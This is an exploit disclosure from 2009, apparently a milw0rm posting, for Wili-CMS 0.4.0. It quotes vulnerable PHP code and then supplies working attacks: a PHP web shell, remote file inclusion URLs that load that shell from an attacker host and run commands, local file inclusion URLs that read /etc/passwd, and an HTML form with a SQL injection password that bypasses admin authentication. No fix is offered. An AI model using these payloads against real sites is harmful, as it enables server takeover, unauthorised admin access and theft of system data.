<html><head><title>Wili-CMS 0.4.0 (RFI/LFI/AB) Multiple Remote Vulnerabilities</title></head><pre>*******   Salvatore &quot;drosophila&quot; Fresta   *******

[+] Application: Wili-CMS
[+] Version: 0.4.0
[+] Website: http://wili-cms.sourceforge.net/

[+] Bugs: [A] Multiple Remote/Local File Inclusion
          [B] Authentication Bypass

[+] Exploitation: Remote
[+] Date: 06 Mar 2009

[+] Discovered by: Salvatore &quot;drosophila&quot; Fresta
[+] Author: Salvatore &quot;drosophila&quot; Fresta
[+] Contact: e-mail: drosophilaxxx@gmail.com


*************************************************

[+] Menu

1) Bugs
2) Code
3) Fix


*************************************************

[+] Bugs


- [A] Multiple Remote/Local File Inclusion

[-] Requisites: none
[-] File affected: index.php

This bug allows a guest to include remote and
local files and however to exec remote commands.

...

if ( $globals['dbh'] &amp;&amp; !pageExists( $globals['pageid']['pid'] ) ) {
    include( $globals['content_dir'].$globals['template_dir'].&quot;error404.php&quot; );
}

...

include( template_file( $globals['root_template'] ) );


- [B] Authentication Bypass

[-] Requisites: magic_quotes_gpc = off
[-] File affected: lib/admin/init_session.php

This bug allows a guest to login as admin.

...

$_SESSION['password'] = $_REQUEST['password'] ? $_REQUEST['password']
: $_SESSION['password'];
$globals['username'] = $_SESSION['uname'] = $_REQUEST['uname'] ?
$_REQUEST['uname'] : $_SESSION['uname'];

...

$sth = mysql_query(
       &quot;SELECT id
        FROM &quot;.$globals['userstable'].&quot;
        WHERE username='&quot;.$_SESSION['uname'].&quot;'
        AND adminflag=1
        AND password=PASSWORD('&quot;.$_SESSION['password'].&quot;')&quot;, $globals['dbh'] );

      // password ok -&gt; login
if ( mysql_num_rows( $sth ) &amp;&amp; ( $globals['uid'] = mysql_result($sth,0) ) ) {
	$globals['user'] = mysql_result( $userh = mysql_query( &quot;SELECT id,
skipwelcome FROM &quot;.$globals['userstable'].&quot; WHERE
username='&quot;.$globals['username'].&quot;'&quot;, $globals['dbh'] ),0,0);

    if ( $globals['admin_modus'] == &quot;loggedin&quot; ) {
         // log login
         db_addlog( &quot;Logged in from &quot;.getenv(&quot;REMOTE_ADDR&quot;) );
         // goto welcome page if skipwelcome flag of this user is not set
         if ( !(mysql_result( $userh, 0, 1 )) ) {
           $_REQUEST['npage'] = get_firstpage( &quot;adminwelcome&quot; );
         }
         $globals['admin_modus'] = &quot;&quot;;
    }

    ...


*************************************************

[+] Code


- [A] Multiple Remote/Local File Inclusion

shell.txt: &lt;?php system($_GET['cmd']); ?&gt;

http://www.site.com/path/?npage=-1&amp;content_dir=http://www.evilsite.com/shell.txt%00&amp;cmd=ls
http://www.site.com/path/?npage=1&amp;content_dir=http://www.evilsite.com/shell.txt%00&amp;cmd=ls

http://www.site.com/path/?npage=-1&amp;content_dir=../../../../etc/passwd%00
http://www.site.com/path/?npage=1&amp;content_dir=../../../../etc/passwd%00


- [B] Authentication Bypass

&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Wili-CMS 0.4.0 Authentication Bypass Exploit&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;form action=&quot;http://www.site.com/path/admin.php&quot; method=&quot;POST&quot;&gt;
      &lt;input type=&quot;text&quot; name=&quot;uname&quot; value=&quot;admin&quot;&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;1') UNION ALL SELECT 1#&quot;&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;mode&quot; value=&quot;loggedin&quot;&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;npage&quot; value=&quot;1&quot;&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Exploit&quot;&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;


*************************************************

[+] Fix

No fix.


*************************************************

# milw0rm.com [2009-03-06]</pre></html>